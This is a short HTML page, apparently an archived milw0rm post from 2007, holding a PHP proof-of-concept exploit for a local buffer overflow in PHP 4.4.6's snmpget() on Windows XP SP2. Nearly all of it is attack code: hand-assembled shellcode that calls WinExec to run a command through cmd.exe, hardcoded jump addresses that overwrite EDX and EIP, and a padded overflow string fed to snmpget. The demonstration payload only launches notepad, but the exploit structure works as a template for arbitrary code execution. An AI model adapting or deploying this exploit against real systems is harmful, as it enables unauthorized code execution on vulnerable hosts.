<html><head><title>PHP 4.4.6 snmpget() object id Local Buffer Overflow Exploit PoC</title></head><pre>&lt;?php

// PHP 4.4.6 snmpget() object id local buffer overflow poc exploit
// by rgod
// site: http://retrogod.altervista.org

// win xp sp2 version
// to be launched form the cli


if (!extension_loaded(&quot;snmp&quot;)){
die(&quot;you need the snmp extension loaded.&quot;);
}

$____scode=
&quot;\xeb\x1b&quot;.
&quot;\x5b&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\x31\xc0&quot;.
&quot;\x88\x43\x59&quot;.
&quot;\x53&quot;.
&quot;\xbb\x6d\x13\x86\x7c&quot;. //WinExec
&quot;\xff\xd3&quot;.
&quot;\x31\xc0&quot;.
&quot;\x50&quot;.
&quot;\xbb\xda\xcd\x81\x7c&quot;. //ExitProcess
&quot;\xff\xd3&quot;.
&quot;\xe8\xe0\xff\xff\xff&quot;.
&quot;\x63\x6d\x64&quot;.
&quot;\x2e&quot;.
&quot;\x65&quot;.
&quot;\x78\x65&quot;.
&quot;\x20\x2f&quot;.
&quot;\x63\x20&quot;.
&quot;start notepad &amp; &quot;;

$edx=&quot;\x64\x8f\x9b\x01&quot;; //jmp scode
$eip=&quot;\x73\xdc\x82\x7c&quot;; //0x7C82DC73      jmp edx
$____suntzu=str_repeat(&quot;A&quot;,188).$edx.str_repeat(&quot;A&quot;,64).$eip.str_repeat(&quot;\x90&quot;,48).$____scode.str_repeat(&quot;\x90&quot;,48);
//more than 256 chars result in simple eip overwrite
snmpget(1,1,$____suntzu);

?&gt;

# milw0rm.com [2007-03-09]</pre></html>